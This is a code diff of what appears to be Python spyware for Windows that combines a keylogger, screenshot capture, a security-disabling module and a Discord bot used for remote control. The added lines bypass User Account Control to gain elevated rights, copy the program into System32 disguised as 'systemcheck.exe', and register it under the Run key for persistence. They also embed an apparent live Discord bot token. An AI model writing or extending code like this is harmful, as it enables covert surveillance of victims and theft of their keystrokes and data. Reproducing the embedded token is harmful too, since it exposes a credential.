@@ -1,6 +1,7 @@
 from core import keylogger, sender, turn_off_security
 from PIL import ImageGrab
 from discord_bot import bot
+from winpwnage.functions.elevate.elevateMethod1 import elevateMethod1
 import time, os, sys, shutil, win32api, win32con, threading
 
 if getattr(sys, 'frozen', False):
@@ -9,6 +10,11 @@ if getattr(sys, 'frozen', False):
 elif __file__:
 	file_path = __file__
 	type_of = "py"
+
+if os.path.dirname(file_path) != 'C:\\Windows\\System32':
+	if True:
+		elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"cp {file_path} c:\\windows\\system32\\systemcheck.exe"])
+		elevateMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d c:\\windows\\system32\\systemcheck.exe'])
 
 if os.path.dirname(file_path) != "C:\\SysCheck":
 	try:
@@ -73,7 +79,7 @@ def LogSend():
 			time_count = time_delay
 
 def BotControl():
-	bot.client.run('')
+	bot.client.run('MTEyODYxNzQxNTE4MjM4OTM1OA.GHNYYA.2BmFRDOd6kC3vAkHIYMcEpLRoJLk7PViJezd-s')
 
 log_send = threading.Thread(target = LogSend, daemon=True)
 bot_th = threading.Thread(target = BotControl)
